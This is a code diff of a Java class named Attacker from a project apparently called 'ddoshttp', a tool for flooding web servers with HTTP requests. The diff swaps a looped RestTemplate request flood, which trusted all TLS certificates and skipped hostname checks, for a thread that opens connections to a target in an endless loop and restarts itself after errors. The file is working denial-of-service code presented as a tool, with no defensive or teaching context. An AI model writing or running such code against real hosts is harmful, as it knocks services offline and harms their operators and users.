@@ -2,65 +2,40 @@ package ua.cc.lajdev.ddoshttp.worker;
 
 import ua.cc.lajdev.ddoshttp.DemoApplication;
 import lombok.Builder;
-import org.apache.http.config.Registry;
-import org.apache.http.config.RegistryBuilder;
-import org.apache.http.conn.socket.ConnectionSocketFactory;
-import org.apache.http.conn.socket.PlainConnectionSocketFactory;
-import org.apache.http.conn.ssl.NoopHostnameVerifier;
-import org.apache.http.conn.ssl.SSLConnectionSocketFactory;
-import org.apache.http.impl.client.CloseableHttpClient;
-import org.apache.http.impl.client.HttpClients;
-import org.apache.http.impl.conn.BasicHttpClientConnectionManager;
-import org.apache.http.ssl.SSLContexts;
-import org.springframework.http.HttpMethod;
-import org.springframework.http.ResponseEntity;
-import org.springframework.http.client.HttpComponentsClientHttpRequestFactory;
-import org.springframework.web.client.RestTemplate;
 
-import javax.net.ssl.SSLContext;
-import java.security.KeyManagementException;
-import java.security.KeyStoreException;
-import java.security.NoSuchAlgorithmException;
+import java.io.IOException;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.time.LocalDateTime;
+import java.time.ZoneId;
 
 
 @Builder
-public class Attacker implements Runnable {
+public class Attacker extends Thread {
 
-    private final int connectionsCount;
-    private final int attackTimes;
     private final String hostName;
 
     @Override
     public void run() {
+        connect();
+    }
+
+    private void connect() {
         try {
-            CloseableHttpClient httpclient = getCloseableHttpClient();
-            RestTemplate restTemplate = new RestTemplate(new HttpComponentsClientHttpRequestFactory(httpclient));
-            for (int i = 0; i < connectionsCount; i++) {
-                for (int j = 0; j < attackTimes; j++) {
-                    ResponseEntity<String> response = restTemplate.exchange(hostName, HttpMethod.GET, null, String.class);
-                    DemoApplication.printConsole(hostName + " attacked " + j + " times: Response: " + response.getStatusCodeValue());
-                }
-                httpclient.close();
+            while (true) {
+                HttpURLConnection connection = (HttpURLConnection) new URL(hostName).openConnection();
+                String format = String.format("%s - %s, %s - %s", LocalDateTime.now(ZoneId.systemDefault()), hostName, connection.getResponseCode(), connection.getResponseMessage());
+                System.out.println(format);
             }
+        } catch (IOException e) {
+            printError(e.getMessage());
+            connect();
         } catch (Exception e) {
             printError(e.getMessage());
         }
     }
 
-    private CloseableHttpClient getCloseableHttpClient() throws NoSuchAlgorithmException, KeyManagementException, KeyStoreException {
-        SSLContext sslContext = SSLContexts.custom().loadTrustMaterial(null, (cert, authType) -> true).build();
-        SSLConnectionSocketFactory sslsf = new SSLConnectionSocketFactory(sslContext, NoopHostnameVerifier.INSTANCE);
-        Registry<ConnectionSocketFactory> socketFactoryRegistry = RegistryBuilder.<ConnectionSocketFactory>create()
-                .register("https", sslsf)
-                .register("http", new PlainConnectionSocketFactory())
-                .build();
-        return HttpClients.custom()
-                .setSSLSocketFactory(sslsf)
-                .setConnectionManager(new BasicHttpClientConnectionManager(socketFactoryRegistry))
-                .build();
-    }
-
     private void printError(String message) {
-        DemoApplication.printConsole(message);
+        DemoApplication.printConsole(String.format("%s: Attack aborted. %s", hostName, message));
     }
 }
